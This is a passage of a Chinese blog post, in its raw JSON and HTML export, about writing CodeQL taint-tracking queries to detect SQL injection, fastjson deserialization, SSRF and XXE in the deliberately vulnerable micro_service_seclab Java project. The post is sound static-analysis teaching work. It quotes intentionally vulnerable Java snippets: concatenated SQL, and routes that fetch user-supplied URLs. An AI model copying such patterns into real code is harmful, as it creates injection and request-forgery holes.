删除int类型参数\n\n这个方法的参数类型是 `List<Long>`，不会存在注入漏洞。\n这说明我们的规则里，对于 `List<Long>` ，甚至 `List<Integer>` 类型都会产生误报，source 误把这种类型的参数涵盖了。\n我们需要采用 `isSanitizer` 来消除这种情况。\n\n![image-20241129140751142](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241129140751142.png)\n\n三个类对应的类型如下\n\nPrimitiveType   > `boolean`, `byte`, `short`, `char`, `int`, `long`, `float`, and `double`.\n\nBoxedType  > `Boolean`, `Byte`, `Short`, `Character`, `Integer`, `Long`, `Float`, and `Double`.\n\nNumberType >  A (reflexive, transitive) subtype of `java.lang.Number`.\n\nParameterizedType 这个类，官方的一些解释。\n\n> A parameterized type is an instantiation of a generic type(泛型类), where each formal type variable has been replaced with a type argument.\n>\n> For example, `List<Number>` is a parameterization of the generic type `List<E>`, where `E` is a type parameter.\n\n```java\noverride predicate isSanitizer(DataFlow::Node node) {\n    node.getType() instanceof PrimitiveType or\n    node.getType() instanceof BoxedType or\n    node.getType() instanceof NumberType or\n    exists(ParameterizedType pt| \n        node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType\n     )\n}\n```\n\n# 解决漏报\n\n我们发现，如下的SQL注入并没有被CodeQL捕捉到。\n\n```java\npublic List<Student> getStudentWithOptional(Optional<String> username) {\n        String sqlWithOptional = \"select * from students where username like '%\" + username.get() + \"%'\";\n        //String sql = \"select * from students where username like ?\";\n        return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);\n}\n```\n\n假如 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 `username` 流转到`username.get()`，这样 `username.get()` 就变得可控了。这样应该就能识别出这个注入漏洞了。\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\npredicate isTaintedString(Expr expSrc, Expr expDest) {\n    exists(Method method, MethodAccess call, MethodAccess call1|\n        expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method\n        and method.hasName(\"get\") and method.getDeclaringType().toString() = \"Optional<String>\"\n        and call1.getArgument(0).getType().toString() = \"Optional<String>\"\n        )\n}\n\nclass VulConfig extends TaintTracking::Configuration {\n     VulConfig() { this = \"SqlInjectionConfig\"}\n    \n    override predicate isSource(DataFlow::Node src) {\n        src instanceof RemoteFlowSource\n    }\n    \n    override predicate isSink(DataFlow::Node sink) {\n        exists(Method method, MethodAccess call |\n            method.hasName(\"query\")\n            and\n            call.getMethod() = method and\n            sink.asExpr() = call.getArgument(0)  // sink.asExpr() 是一个方法，用于将一个 sink 转换成一个表达式。这个方法通常用于在查询中使用 sink，因为查询需要将 sink 转换成表达式才能进行分析。\n        )\n    }\n\n    override predicate isSanitizer(DataFlow::Node node) {\n        node.getType() instanceof PrimitiveType or\n        node.getType() instanceof BoxedType or\n        node.getType() instanceof NumberType or\n        exists(ParameterizedType pt| \n            node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType\n         )\n    }\n\n    override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {\n        isTaintedString(node1.asExpr(), node2.asExpr())\n    }\n\n}\n\nfrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n# fastjson\n\n```java\n import java\n import semmle.code.java.dataflow.FlowSources\n import semmle.code.java.security.QueryInjection\n import DataFlow::PathGraph\n \n class FastjsonVulConfig extends TaintTracking::Configuration {\n     FastjsonVulConfig() { this = \"fastjson\" }\n     \n     override predicate isSource(DataFlow::Node src) {\n         src instanceof RemoteFlowSource\n     }\n     \n     override predicate isSink(DataFlow::Node sink) {\n         exists(Method method, MethodAccess call|\n             method.hasName(\"parseObject\")\n             and\n             call.getMethod() = method and\n             sink.asExpr() = call.getArgument(0)\n             )\n     }\n }\n \n from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink\n where fastjsonVul.hasFlowPath(source, sink)\n select source.getNode(), source, sink, \"source\"\n```\n\n# SSRF\n\n RequestForgerySink 类。\n\n> A data flow sink for server-side request forgery (SSRF) vulnerabilities.\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\nimport semmle.code.java.security.RequestForgeryConfig\n\nclass SSRFVulConfig extends TaintTracking::Configuration {\n\t\tSSRFVulConfig() { this = \"SSRFVulConfig\" }\n    \n    override predicate isSource(DataFlow::Node src) {\n        src instanceof RemoteFlowSource\n    }\n    \n    override predicate isSink(DataFlow::Node sink) {\n    sink instanceof RequestForgerySink\n    }\n }\n from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\n where ssrfVulConfig.hasFlowPath(source, sink)\n select source.getNode(), source, sink, \"source\"\n```\n\n# ssrf 漏报处理1\n\n## 漏报原因排查\n\n但是其实ssrf 提供了5个路由都可以可以进行ssrf的，但是只排查出了3个。首先看看 two 这个路由 \n\n```java\n@RequestMapping(value = \"/two\")\npublic String Two(@RequestParam(value = \"url\") String imageUrl) {\n    try {\n        URL url = new URL(imageUrl);\n        HttpResponse response = Request.Get(String.valueOf(url)).execute().returnResponse();\n        return response.toString();\n    } catch (IOException var1) {\n        System.out.println(var1);\n        return \"Hello\";\n    }\n}\n```\n\n`imageUrl→url = new URL(imageUrl)→String.valueOf(url)→Request.Get(String.valueOf(url))`\n\n在 `two` 接口中的代码有问题的地方如下，用到了 `String.valueOf(url)`,正常情况下程序不会觉得 `String.valueOf()` 方法返回的仍然是污点。因此我们需要修改 Config 中的 `isAdditionalTaintStep` 方法，将 `java.net.URL` 和 `String.valueOf(url)` 绑定。\n\n我们这里直接跟进RequestForgeryConfig 这个类看一看。\n\n![image-20241130010138565](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010138565.png)\n\n注意这个isAdditionalTaintStep。继续跟进propagatesTaint谓语。\n\n![image-20241130010703439](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010703439.png)\n\n## 处理方法1\n\n我们这里直接修改 RequestForgery.qll  源码。主要是14到24行，还有 第 47 行。\n\n```java\n/** Provides classes to reason about server-side request forgery (SSRF) attacks. */\n\nimport java\nimport semmle.code.java.frameworks.Networking\nimport semmle.code.java.frameworks.ApacheHttp\nimport semmle.code.java.frameworks.spring.Spring\nimport semmle.code.java.frameworks.JaxWS\nimport semmle.code.java.frameworks.javase.Http\nimport semmle.code.java.dataflow.DataFlow\nimport semmle.code.java.frameworks.Properties\nprivate import semmle.code.java.dataflow.StringPrefixes\nprivate import semmle.code.java.dataflow.ExternalFlow\n\n class TypeStringLib extends RefType {\n    TypeStringLib() { this.hasQualifiedName(\"java.lang\", \"String\") }\n  }\n\n class StringValue extends MethodAccess {\n    StringValue(){\n      this.getCallee().getDeclaringType() instanceof TypeStringLib and\n      this.getCallee().hasName(\"valueOf\")\n    }\n}\n\n/**\n * A unit class for adding additional taint steps that are specific to server-side request forgery (SSRF) attacks.\n *\n * Extend this class to add additional taint steps to the SSRF query.\n */\nclass RequestForgeryAdditionalTaintStep extends Unit {\n  /**\n   * Holds if the step from `pred` to `succ` should be considered a taint\n   * step for server-side request forgery.\n   */\n  abstract predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ);\n}\n\nprivate class DefaultRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep {\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    // propagate to a URI when its host is assigned to\n    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or\n    // propagate to a URL when its host is assigned to\n    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or \n      //处理String.valueOf(URL)\n    exists(StringValue c | c.getArgument(0) = pred.asExpr() | succ.asExpr() = c)\n  }\n}\n\nprivate class TypePropertiesRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep\n{\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    exists(MethodAccess ma |\n      // Properties props = new Properties();\n      // props.setProperty(\"jdbcUrl\", tainted);\n      // Propagate tainted value to the qualifier `props`\n      ma.getMethod() instanceof PropertiesSetPropertyMethod and\n      ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = \"jdbcUrl\" and\n      pred.asExpr() = ma.getArgument(1) and\n      succ.asExpr() = ma.getQualifier()\n    )\n  }\n}\n\n/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */\nabstract class RequestForgerySink extends DataFlow::Node { }\n\nprivate class DefaultRequestForgerySink extends RequestForgerySink {\n  DefaultRequestForgerySink() { sinkNode(this, \"request-forgery\") }\n}\n\n/** A sanitizer for request forgery vulnerabilities. */\nabstract class RequestForgerySanitizer extends DataFlow::Node { }\n\nprivate class PrimitiveSanitizer extends RequestForgerySanitizer {\n  PrimitiveSanitizer() {\n    this.getType() instanceof PrimitiveType or\n    this.getType() instanceof BoxedType or\n    this.getType() instanceof NumberType\n  }\n}\n\nprivate class HostnameSanitizingPrefix extends InterestingPrefix {\n  int offset;\n\n  HostnameSanitizingPrefix() {\n    // Matches strings that look like when prepended to untrusted input, they will restrict\n    // the host or entity addressed: for example, anything containing `?` or `#`, or a slash that\n    // doesn't appear to be a protocol specifier (e.g. `http://` is not sanitizing), or specifically\n    // the string \"/\".\n    exists(this.getStringValue().regexpFind(\"([?#]|[^?#:/\\\\\\\\][/\\\\\\\\])|^/$\", 0, offset))\n  }\n\n  override int getOffset() { result = offset }\n}\n\n/**\n * A value that is the result of prepending a string that prevents any value from controlling the\n * host of a URL.\n */\nprivate class HostnameSantizer extends RequestForgerySanitizer {\n  HostnameSantizer() { this.asExpr() = any(HostnameSanitizingPrefix hsp).getAnAppendedExpression() }\n}\n\n```\n\n## 处理方法2\n\n或者不改写lib，直接改写 ql 查询语句。\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.dataflow.ExternalFlow\nimport DataFlow::PathGraph\nimport semmle.code.java.security.RequestForgeryConfig\n\nclass TypeStringLib extends RefType {\n  TypeStringLib() { this.hasQualifiedName(\"java.lang\", \"String\") }\n}\n\nclass StringValue extends MethodAccess {\n  StringValue(){\n    this.getCallee().getDeclaringType() instanceof TypeStringLib and\n    this.getCallee().hasName(\"valueOf\")\n  }\n}\n\nprivate class MyRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep {\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    // propagate to a URI when its host is assigned to\n    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or\n    // propagate to a URL when its host is assigned to\n    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or \n    //处理String.valueOf(URL)\n    exists(StringValue c | c.getArgument(0) = pred.asExpr() | succ.asExpr() = c)\n  }\n}\n\nclass SSRFVulConfig extends TaintTracking::Configuration {\n  SSRFVulConfig() { this = \"first_modifySSRF\" }\n\n  override predicate isSource(DataFlow::Node source) {\n      source instanceof RemoteFlowSource and\n      // Exclude results of remote HTTP requests: fetching something else based on that result\n      // is no worse than following a redirect returned by the remote server, and typically\n      // we're requesting a resource via https which we trust to only send us to safe URLs.\n      not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod\n    }\n\n   override predicate isSink(DataFlow::Node sink) {\n      sink instanceof RequestForgerySink\n   }\n\n   override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) {\n      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)\n    }\n\n\n}\nfrom SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere ssrfVulConfig.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n# ssrf 漏报处理2\n\n还有一个漏的。\n\n```java\n@RequestMapping(value = \"/three\")\npublic String Three(@RequestParam(value = \"url\") String imageUrl) {\n    try {\n        URL url = new URL(imageUrl);\n        OkHttpClient client = new OkHttpClient();\n        com.squareup.okhttp.Request request = new com.squareup.okhttp.Request.Builder().get().url(url).build();\n        Call call = client.newCall(request);\n        Response response = call.execute();\n        return response.toString();\n    } catch (IOException var1) {\n        System.out.println(var1);\n        return \"Hello\";\n    }\n}\n```\n\ncom.squareup.okhttp.Request request = new com.squareup.okhttp.Request.Builder().get().url(url).build();\n\n这种请求相对更复杂，因此需要自行构造规则。在这一条 ql 的语句当中有两个关键的定位锚点，一个是`url(url)`，一个是 `build()`，`url()` 确定是否引入污点，`build()` 确定sink的位置。结合这两者，进行检测 ql 的构造。先看一下这个的语法树AST。\n\n![image-20241130014216314](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130014216314.png)\n\n这种链式结构调用在语法树中是包含的关系，当获取到最外层的 MethodAccess 时，可以使用 `getAChildExpr()` 方法返回其子语句，使用 `getAChildExpr+()` 可以递归返回全部子语句。结合前面说到的两个关键定位锚点，进行如下代码构造\n\n最终。效果。7-20 行 ，56 行\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.dataflow.ExternalFlow\nimport DataFlow::PathGraph\nimport semmle.code.java.security.RequestForgeryConfig\n\nMethodAccess url(MethodAccess ma,DataFlow::Node node){\n  exists( MethodAccess mc | mc = ma.getAChildExpr()| if mc.getCallee().hasName(\"url\") and mc.getArgument(0) = node.asExpr() then result = mc else result = url(mc,node)\n  )\n}\n\nMethodAccess m(DataFlow::Node node){\n  exists(\n      MethodAccess ma | ma.getCallee().hasName(\"build\") and ma.getCallee().getDeclaringType().hasName(\"Builder\") |result = url(ma,node)\n  )\n}\n\nclass TypeStringLib extends RefType {\n  TypeStringLib() { this.hasQualifiedName(\"java.lang\", \"String\") }\n}\n\nclass StringValue extends MethodAccess {\n  StringValue(){\n    this.getCallee().getDeclaringType() instanceof TypeStringLib and\n    this.getCallee().hasName(\"valueOf\")\n  }\n}\n\nprivate class MyRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep {\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    // propagate to a URI when its host is assigned to\n    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or\n    // propagate to a URL when its host is assigned to\n    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or \n    //处理String.valueOf(URL)\n    exists(StringValue c | c.getArgument(0) = pred.asExpr() | succ.asExpr() = c)\n  }\n}\n\nclass SSRFVulConfig extends TaintTracking::Configuration {\n  SSRFVulConfig() { this = \"first_modifySSRF\" }\n\n  override predicate isSource(DataFlow::Node source) {\n      source instanceof RemoteFlowSource and\n      // Exclude results of remote HTTP requests: fetching something else based on that result\n      // is no worse than following a redirect returned by the remote server, and typically\n      // we're requesting a resource via https which we trust to only send us to safe URLs.\n      not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod\n    }\n\n   override predicate isSink(DataFlow::Node sink) {\n      sink instanceof RequestForgerySink or  \n      //sink = URL对象\n      exists (m(sink))\n   }\n\n   override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) {\n      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)\n    }\n\n\n}\nfrom SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere ssrfVulConfig.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n\n\n# XXE\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.dataflow.ExternalFlow\nimport DataFlow::PathGraph\n\nclass XXEVulConfig extends TaintTracking::Configuration {\n  XXEVulConfig(){\n      this = \"XXEVulConfig\"\n  }\n\n  override predicate isSource(DataFlow::Node src) {\n      src instanceof RemoteFlowSource\n  }\n\n  override predicate isSink(DataFlow::Node sink) {\n      exists(Method method, MethodAccess call|\n          method.hasName(\"parse\") and\n          call.getMethod() = method and\n          sink.asExpr() = call.getArgument(0)\n          )\n  }\n}\n\nfrom XXEVulConfig xxeVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere xxeVulConfig.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n\n\n","slug":"codeql练习-micro_service_seclab","published":1,"date":"2024-12-02T18:30:12.515Z","updated":"2024-12-02T18:30:12.513Z","comments":1,"layout":"post","photos":[],"_id":"cm5js0ude0003ub9p9yvibb0j","content":"<p>不会的类要积极的去 CodeQL standard libraries 里面翻看。然后多积累，多记录。</p>\n<h1 id=\"构建数据库\"><a href=\"#构建数据库\" class=\"headerlink\" title=\"构建数据库\"></a>构建数据库</h1><p>项目地址 <a href=\"https://github.com/l4yn3/micro_service_seclab\">https://github.com/l4yn3/micro_service_seclab</a></p>\n<p><code>codeql database create ~/xxxxxx/micro-service-seclab-database  --language=&quot;java&quot;  --command=&quot;mvn clean package -Dmaven.test.skip=true&quot; --source-root=./micro-service-seclab/</code></p>\n<p><code>codeql database create D:\\codeqls\\CodeQL-Practice --language=&quot;java&quot; --source-root=D:\\codeqls\\micro_service_seclab --command=&quot;mvn clean package -Dmaven.test.skip=true&quot;</code></p>\n<h1 id=\"查看sql注入的点\"><a href=\"#查看sql注入的点\" class=\"headerlink\" title=\"查看sql注入的点\"></a>查看sql注入的点</h1><blockquote>\n<p> <code>RemoteFlowSource</code>   : A data flow source of remote user input.</p>\n</blockquote>\n<p><a href=\"https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/FlowSources.qll/type.FlowSources$RemoteFlowSource.html\">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/FlowSources.qll/type.FlowSources$RemoteFlowSource.html</a></p>\n<p>比如下面这个</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(value = &quot;/one&quot;)</span>    </span><br><span class=\"line\"><span class=\"keyword\">public</span> List&lt;Student&gt; <span class=\"title function_\">one</span><span class=\"params\">(<span class=\"meta\">@RequestParam(value = &quot;username&quot;)</span> String username)</span> &#123;    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> indexLogic.getStudent(username);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">VulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">     VulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;SqlInjectionConfig&quot;</span>&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">        exists(Method method, MethodAccess call |</span><br><span class=\"line\">            method.hasName(<span class=\"string\">&quot;query&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            call.getMethod() = method and</span><br><span class=\"line\">            sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where config.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h1><p>在开始下面的这些之前。可以先来一个测试案例，然后看看官方的standard libraries 感受一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"> </span><br><span class=\"line\">from Method method ,MethodAccess call</span><br><span class=\"line\">where call.getMethod() = method</span><br><span class=\"line\">select method,call,call.getArgument(<span class=\"number\">0</span>),call.getArgument(<span class=\"number\">0</span>).getType()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"删除int类型参数\"><a href=\"#删除int类型参数\" class=\"headerlink\" title=\"删除int类型参数\"></a>删除int类型参数</h1><p>这个方法的参数类型是 <code>List&lt;Long&gt;</code>，不会存在注入漏洞。<br>这说明我们的规则里，对于 <code>List&lt;Long&gt;</code> ，甚至 <code>List&lt;Integer&gt;</code> 类型都会产生误报，source 误把这种类型的参数涵盖了。<br>我们需要采用 <code>isSanitizer</code> 来消除这种情况。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241129140751142.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241129140751142.png\"  alt=\"image-20241129140751142\" lazyload></a></p>\n<p>三个类对应的类型如下</p>\n<p>PrimitiveType   &gt; <code>boolean</code>, <code>byte</code>, <code>short</code>, <code>char</code>, <code>int</code>, <code>long</code>, <code>float</code>, and <code>double</code>.</p>\n<p>BoxedType  &gt; <code>Boolean</code>, <code>Byte</code>, <code>Short</code>, <code>Character</code>, <code>Integer</code>, <code>Long</code>, <code>Float</code>, and <code>Double</code>.</p>\n<p>NumberType &gt;  A (reflexive, transitive) subtype of <code>java.lang.Number</code>.</p>\n<p>ParameterizedType 这个类，官方的一些解释。</p>\n<blockquote>\n<p>A parameterized type is an instantiation of a generic type(泛型类), where each formal type variable has been replaced with a type argument.</p>\n<p>For example, <code>List&lt;Number&gt;</code> is a parameterization of the generic type <code>List&lt;E&gt;</code>, where <code>E</code> is a type parameter.</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">override predicate <span class=\"title function_\">isSanitizer</span><span class=\"params\">(DataFlow::Node node)</span> &#123;</span><br><span class=\"line\">    node.getType() <span class=\"keyword\">instanceof</span> PrimitiveType or</span><br><span class=\"line\">    node.getType() <span class=\"keyword\">instanceof</span> BoxedType or</span><br><span class=\"line\">    node.getType() <span class=\"keyword\">instanceof</span> NumberType or</span><br><span class=\"line\">    <span class=\"title function_\">exists</span><span class=\"params\">(ParameterizedType pt| </span></span><br><span class=\"line\"><span class=\"params\">        node.getType()</span> = pt and pt.getTypeArgument(<span class=\"number\">0</span>) <span class=\"keyword\">instanceof</span> NumberType</span><br><span class=\"line\">     )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"解决漏报\"><a href=\"#解决漏报\" class=\"headerlink\" title=\"解决漏报\"></a>解决漏报</h1><p>我们发现，如下的SQL注入并没有被CodeQL捕捉到。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> List&lt;Student&gt; <span class=\"title function_\">getStudentWithOptional</span><span class=\"params\">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">sqlWithOptional</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class=\"string\">&quot;%&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>假如 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 <code>username</code> 流转到<code>username.get()</code>，这样 <code>username.get()</code> 就变得可控了。这样应该就能识别出这个注入漏洞了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.QueryInjection</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\">predicate <span class=\"title function_\">isTaintedString</span><span class=\"params\">(Expr expSrc, Expr expDest)</span> &#123;</span><br><span class=\"line\">    exists(Method method, MethodAccess call, MethodAccess call1|</span><br><span class=\"line\">        expSrc = call1.getArgument(<span class=\"number\">0</span>) <span class=\"type\">and</span> <span class=\"variable\">expDest</span> <span class=\"operator\">=</span> call and call.getMethod() = method</span><br><span class=\"line\">        and method.hasName(<span class=\"string\">&quot;get&quot;</span>) and method.getDeclaringType().toString() = <span class=\"string\">&quot;Optional&lt;String&gt;&quot;</span></span><br><span class=\"line\">        and call1.getArgument(<span class=\"number\">0</span>).getType().toString() = <span class=\"string\">&quot;Optional&lt;String&gt;&quot;</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">VulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">     VulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;SqlInjectionConfig&quot;</span>&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">        src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">        exists(Method method, MethodAccess call |</span><br><span class=\"line\">            method.hasName(<span class=\"string\">&quot;query&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            call.getMethod() = method and</span><br><span class=\"line\">            sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)  <span class=\"comment\">// 